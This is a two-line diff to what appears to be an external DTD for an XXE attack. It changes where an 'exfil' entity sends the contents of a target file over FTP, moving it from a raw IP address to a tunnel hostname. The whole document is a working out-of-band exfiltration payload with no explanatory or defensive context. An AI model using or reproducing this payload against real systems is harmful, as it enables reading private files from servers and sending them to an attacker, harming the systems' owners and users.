@@ -1,2 +1,2 @@
-<!ENTITY % all '<!ENTITY &#x25; exfil SYSTEM "ftp://139.162.14.64:38927/%file;">'>
+<!ENTITY % all '<!ENTITY &#x25; exfil SYSTEM "ftp://klnov-49-206-99-72.a.free.pinggy.link:38927/%file;">'>
 %all;
